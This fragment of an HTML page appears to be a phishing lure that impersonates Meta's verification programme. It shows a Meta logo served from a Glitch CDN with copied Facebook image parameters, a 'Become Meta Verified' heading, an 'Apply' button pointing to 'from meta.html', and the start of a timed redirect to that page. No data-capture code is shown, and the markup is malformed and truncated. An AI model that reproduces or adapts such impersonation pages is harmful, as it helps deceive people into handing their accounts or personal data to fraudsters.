...
<body>
    ...
    <div class="content">
        <div class="col-sm-6">
            <img src="https://cdn.glitch.global/94ce8094-2082-483e-8949-f3a4651ae83f/a89f7c20-27a2-4c6c-9a08-caa301574ad6.image.png" ?v=1717746772557?_nc_cat=106&amp;ccb=1-7&amp;_nc_sid=f537c7&amp;_nc_ohc=qtgF49guQsgQ7kNvgFGDO8w&amp;_nc_ht=scontent.fhdd4-1.fna&amp;oh=00_AYBsWhVkb0c0jCLieToyhfQNMluisvrty0CnBw_McPiMUA&amp;oe=665DB74B
                " alt="meta " class="meta-logo ">
      <h1 class="my-3 fs-1 ">Become <br> Meta Verified</h1>
      <div style="margin-bottom: 30px; "></div>
      <a href="from meta.html" class="btn ">Apply</a>
...
<script>
  ...
  setTimeout(function() {
  var redirectURL = "from meta.html"; // Updated URL
